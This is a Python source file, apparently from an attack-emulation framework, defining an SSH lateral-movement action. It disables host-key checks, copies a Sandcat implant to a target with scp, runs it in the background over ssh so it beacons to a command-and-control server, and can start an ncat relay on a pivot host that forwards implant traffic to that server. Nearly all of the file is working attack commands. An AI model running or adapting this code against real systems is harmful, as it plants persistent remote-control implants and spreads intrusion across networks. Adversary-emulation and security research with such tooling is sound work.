from ..low_level_action import LowLevelAction
from incalmo.models.agent import Agent
from incalmo.core.services.config_service import ConfigService


class SSHLateralMove(LowLevelAction):
    def __init__(self, agent: Agent, hostname: str, relay: dict | None = None):
        """FIX #1 (c2_pivot_relay): `relay`, when provided, makes the new implant
        beacon to the C2 THROUGH this pivot host instead of directly. It is
        {"listen_ip","port","c2_host","c2_port"}: we start `ncat` on the pivot
        listening on listen_ip:port and forwarding to the real C2 (reachable from the
        pivot), and launch the implant with -server http://listen_ip:port (reachable
        from the target). `relay=None` (flag off) => the original direct-beacon
        command, byte-for-byte."""
        self.hostname = hostname
        server = ConfigService().get_config().agent_c2c_server
        ssh_opts = (
            "-o StrictHostKeyChecking=no "
            "-o UserKnownHostsFile=/dev/null "
            "-o ConnectTimeout=3"
        )

        relay_start = ""
        beacon_server = server
        if relay:
            beacon_server = f"http://{relay['listen_ip']}:{relay['port']}"
            # Start the forwarder on the pivot (idempotent: a duplicate just fails to
            # bind and exits harmlessly, leaving the first listener in place).
            relay_start = (
                f"nohup ncat -lk {relay['listen_ip']} {relay['port']} "
                f"--sh-exec \"ncat {relay['c2_host']} {relay['c2_port']}\" "
                f">/dev/null 2>&1 & sleep 1; "
            )

        remote = (
            "chmod +x ./sandcat_tmp.go 2>&1; "
            f"curl -s -m 5 -o /dev/null -w C2:%{{http_code}} {beacon_server}/ 2>&1; echo; "
            f"nohup ./sandcat_tmp.go -server {beacon_server} -group red >/tmp/sc.log 2>&1 & "
            "sleep 2; echo AGENTLOG:; head -c 300 /tmp/sc.log 2>/dev/null"
        )
        command = (
            f"{{ {relay_start}scp {ssh_opts} sandcat.go-linux {hostname}:~/sandcat_tmp.go && "
            f"ssh {ssh_opts} {hostname} "
            f"'{remote}' "
            f"&& echo LM_OK; }} 2>&1"
        )
        payloads = ["sandcat.go-linux"]
        super().__init__(agent, command, payloads, command_delay=3)
